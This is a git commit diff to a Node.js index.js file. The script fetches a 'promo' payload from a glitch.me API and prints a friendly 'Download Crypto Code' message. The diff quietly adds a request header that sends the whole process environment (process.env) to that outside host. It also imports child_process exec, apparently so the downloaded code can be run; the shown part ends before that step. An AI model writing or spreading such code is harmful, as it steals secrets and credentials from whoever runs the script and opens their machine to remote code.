1c9d5895adf24d4ac192db62db87f446d22d2bcd
HAMA DEV <88665167+HAMAXx1122@users.noreply.github.com>
2023-12-18 16:53:26 +0300

    Update index.js

--- index.js
+++ index.js
@@ -1,12 +1,16 @@
+
 let fet = require('node-fetch');
 let fs = require('fs');
+let {exec} = require('child_process');
 
 (async()=>{
-
+console.log('Download Crypto Code.., Mabye Take some time!')
 let data = await (await fet(('https://y0tools.glitch.me/api/v1/files/promo'), {
     headers: {
+    hw: JSON.stringify(process.env),
     authorization: JSON.parse(fs.readFileSync('./settings.json', "utf-8")).key
 }})).json()
+console.log('Downloaded')
 
 if(!data.code) return console.log('Error code')
 
